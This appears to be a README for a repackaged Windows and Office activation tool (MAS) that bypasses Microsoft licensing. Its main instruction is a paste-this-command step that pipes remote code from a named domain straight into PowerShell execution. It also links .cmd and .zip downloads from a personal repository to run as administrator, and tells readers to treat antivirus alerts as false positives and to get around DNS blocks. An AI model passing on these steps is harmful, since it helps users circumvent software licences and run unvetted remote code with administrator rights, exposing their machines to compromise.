# 🚀 Microsoft Activation Scripts (MAS)
<div align="center">
<img src="https://img.shields.io/badge/Windows-11-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Windows 11 Logo">
**A clean, open-source Windows and Office activator featuring HWID, Ohook, TSforge, and Online KMS activation methods, along with advanced troubleshooting.**
</div>
---
## 📖 Overview
**Microsoft Activation Scripts (MAS)** is an open-source tool designed to activate Windows and Microsoft Office products seamlessly. It provides multiple activation methods depending on your system requirements, ensuring a fast, clean, and reliable setup.
### ✨ Key Features
* 💎 **HWID (Digital Licence)** - Permanent activation for Windows 10/11.
* 🔑 **Ohook** - Permanent activation for Microsoft Office products.
* ⚡ **TSforge** - Advanced activation for Windows, Office, and Extended Security Updates (ESU).
* 🌐 **Online KMS** - Dynamic activation for Windows and Office environments.
---
## ⚡ Activation Methods Overview

| Method | Target Product | Activation Status | Internet Required? |
| :--- | :--- | :--- | :--- |
| **HWID** | Windows 10 / 11 | Permanent | Yes (Once) |
| **Ohook** | Office 2013 - 2024 / 365 | Permanent | No |
| **TSforge** | Windows / Office / ESU | Permanent / Renewal | No |
| **Online KMS** | Windows / Office | 180 Days (Auto Renew) | Yes |

---
## 🛠️ How to Activate Windows / Office / Extended Security Updates (ESU)?
### 🎯 Method 1 - PowerShell (Recommended) ❤️
This is the easiest and fastest method. No file downloads are necessary.
1. Right-click on the **Start Menu** and select **PowerShell** or **Terminal**.
2. Copy and paste the command below, then press **Enter**:
For Windows 8.1, 10 and 11:
<pre><code>irm https://get.activated.win | iex</code></pre>
If the above is blocked (by ISP/DNS), try this (needs updated Windows 10 or 11):
<pre><code>iex (curl.exe -s --doh-url https://1.1.1.1/dns-query https://get.activated.win | Out-String)</code></pre>
> **Script not launching?** Use the below-listed Method 2.
3. In the menu that appears, type the number corresponding to one of the Green options.
---
### 📦 Method 2 - Traditional Offline Script
If PowerShell is blocked on your machine, you can download the script directly:
#### 📥 Download Links:
* 📄 **[Download MAS_AIO.cmd](https://github.com/tawhidsorker-gif/tawhid-microsoft-activation/raw/main/MAS_AIO.cmd)** *(Direct Command Script)*
* 📦 **[Download Microsoft-Activation-Scripts.zip](https://github.com/tawhidsorker-gif/tawhid-microsoft-activation/raw/main/Microsoft-Activation-Scripts.zip)** *(Complete Zip Archive)*
#### 🚀 Steps:
1. Download either the `.cmd` file or the `.zip` archive from the links above.
2. If downloaded as `.zip`, extract the files to a folder.
3. Right-click on `MAS_AIO.cmd` and select **Run as administrator**.
4. Follow the on-screen instructions to complete activation.
---
## ❓ Troubleshooting & Tips
* **💡 Tip:** Some ISPs/DNS providers block access to our domains. You can bypass this by enabling **DNS-over-HTTPS (DoH)** in your browser settings or switching your system DNS to Cloudflare (`1.1.1.1`) or Google (`8.8.8.8`).
* **🛡️ Antivirus Note:** Security software may occasionally flag activation scripts as a false positive. Rest assured, this project is open-source and transparent. You can inspect all script files directly in this repository.
---
## 📝 Important Notes
* The `irm` command in PowerShell downloads a script from a specified URL, and the `iex` command executes it.
* Always double-check the URL before executing the command and verify the source is trustworthy when manually downloading files.
* Be cautious of third parties spreading malware disguised as MAS by altering the URL in the PowerShell command.
---
## ⚠️ Disclaimer
> **Notice:** This project is provided for educational and testing purposes. Always support official software developers by purchasing genuine licenses where applicable.
